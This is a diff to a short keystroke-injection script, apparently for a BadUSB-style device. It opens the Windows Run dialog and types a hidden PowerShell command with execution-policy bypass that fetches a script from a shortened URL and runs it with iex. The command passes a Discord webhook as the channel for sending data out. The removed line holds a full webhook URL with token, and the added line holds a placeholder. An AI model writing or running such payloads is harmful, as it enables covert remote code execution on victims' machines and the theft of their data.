@@ -1,5 +1,5 @@
 DELAY 500
 GUI r
 DELAY 200
-STRING powershell -w hidden -ep bypass -nop -c "https://is.gd/lBI1od | iex -webhook 'https://discord.com/api/webhooks/1349127152582525018/MesbCMKY4JaQceGiH2gvJ-afwmxp6SiQc421d2xJqFHiOnIi7TWaWnfT7BTlUktDCa4J'"
+STRING powershell -NoP -Ep Bypass -W H -C $dc='DISCORD_WEBHOOK_HERE'; irm https://is.gd/lBI1od | iex
 ENTER
